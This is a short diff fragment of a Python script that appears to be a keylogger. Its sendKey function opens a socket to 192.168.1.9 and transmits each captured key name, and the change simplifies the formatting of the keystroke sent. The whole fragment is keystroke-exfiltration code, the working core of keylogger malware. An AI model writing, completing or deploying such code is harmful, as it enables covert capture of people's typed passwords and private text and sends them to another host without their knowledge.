@@ -12,9 +12,9 @@ def sendKey (e):
 	# connect to the server on local computer
 	s.connect(('192.168.1.9', port))
 	#line = e.name
-	if e.name != 0:
-		key = e.event_type+" "+e.name#+" "+e.scan_code+" "+e.time
-	
+	#if e.scan_code != 0:
+	#	key = e.event_type+" "+e.scan_code#+" "+e.scan_code+" "+e.time
+	key = e.name
 	#line = '+'.join(str(name) for name in keyboard._pressed_events)
 	s.send(key.encode())
 
